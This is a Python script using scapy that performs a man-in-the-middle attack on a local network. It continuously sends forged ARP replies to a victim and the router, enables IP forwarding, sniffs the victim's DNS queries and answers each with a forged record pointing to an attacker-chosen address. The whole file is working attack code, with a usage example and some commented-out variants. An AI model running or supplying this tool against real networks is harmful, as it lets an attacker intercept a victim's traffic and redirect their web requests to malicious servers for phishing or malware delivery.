from scapy.all import *
from multiprocessing import Process
from subprocess import Popen, PIPE
import argparse, threading, time, re, signal

#python spoof.py -v 192.168.0.7 -r 192.168.0.100 -d 192.168.0.6 -i 192.168.0.8


parser = argparse.ArgumentParser(description='ARP Poisoning and DNS Spoofing')
parser.add_argument('-v', '--victim', dest='victimIP', help="IP Address of the victim", required=True)
parser.add_argument('-i', '--ip', dest='localIP', help="Our IP Address", required=True)
parser.add_argument('-r', '--router', dest='routerIP', help="IP Address of the Router", required=True)
parser.add_argument('-t', '--target', dest='targetIP', help="IP Address of our DNS Responder", required=True)

args = parser.parse_args()
victimIP = args.victimIP
localIP = args.localIP
routerIP = args.routerIP
targetIP = args.targetIP
localMAC = ""
victimMAC = ""
routerMAC = ""


#http://stackoverflow.com/questions/159137/getting-mac-address
def getOurMAC(interface):
    try:
        mac = open('/sys/class/net/'+interface+'/address').readline()
    except:
        mac = "00:00:00:00:00:00"
    return mac[0:17]





#http://stackoverflow.com/questions/1750803/obtain-mac-address-from-devices-using-python
def getMAC(IP):

    #ping to add the target to our system's ARP cache
    pingResult = Popen(["ping", "-c 1", IP], stdout=PIPE)

    pid = Popen(["arp", "-n", IP], stdout=PIPE)
    s = pid.communicate()[0]
    MAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]

    return MAC



def poison(localMAC, victimMAC, routerMAC):
    arpPacketVictim = Ether(src=localMAC, dst=victimMAC)/ARP(hwsrc=localMAC, hwdst=victimMAC, psrc=routerIP, pdst=victimIP, op=2)
    arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=victimIP, pdst=routerIP, op=2)

    print "Active ARP Poison to: " + str(victimIP)

    while 1:
        try:
            sendp(arpPacketVictim, verbose=0)
            sendp(arpPacketRouter, verbose=0)
            time.sleep(3)
        except KeyboardInterrupt:
            sys.exit(0)









def respond(packet):
    global targetIP
    responsePacket = (IP(dst=victimIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                    DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP)))
    send(responsePacket, verbose=0)
    print "Forwarded Spoofed DNS Packet\nReuested: " + str(packet[DNS].qd.qname)
    print "Received: "+ str(targetIP)
    return


#this parse creates a thread
def parse(packet):
    #qr==0 means it is a dns request
	if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
		respondThread = threading.Thread(target=respond, args=packet)
		respondThread.start()

#this parse creates a process
#def parse (packet):
    #if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
        #responseProcess = Process(target=respond, args=packet)
    #    responseProcess.start()
    #    responseProcess.join()

#def parse (packet):
    #if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
        #responsePacket = (IP(dst=victimIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
    #                    DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP)))
    #    send(responsePacket, verbose=0)


def sniffDNS():
    #Popen(["iptables", "-A", "FORWARD", "-p", "53", "-j", "DROP"], shell=True, stdout=PIPE)
    global victimIP
    print "Sniffing for DNS Requests"
    sniffFilter = "udp and port 53 and src " +str(victimIP)
    sniff(filter=sniffFilter, prn=parse)



def reset():
    Popen(["iptables -F"], shell=True, stdout=PIPE)


def setup():
    #check for root user
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")

    #setup forwarding rules
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    #Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)




def main():
    setup()

    victimMAC = getMAC(victimIP)
    localMAC = getOurMAC("eno1")
    routerMAC = getMAC(routerIP)

    #create two threads. one for dns spoofing and one for arp poisoning.
    poisonThread = threading.Thread(target=poison, args=(localMAC, victimMAC, routerMAC))
    spoofThread = threading.Thread(target=sniffDNS)

    #make threads daemons, so that main thread receives KeyboardInterrupt, whole process terminates
    poisonThread.daemon = True
    spoofThread.daemon = True

    poisonThread.start()
    spoofThread.start()




    while True:
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            reset()
            print "Terminating"
            sys.exit(0)




if __name__ == '__main__':
    main()
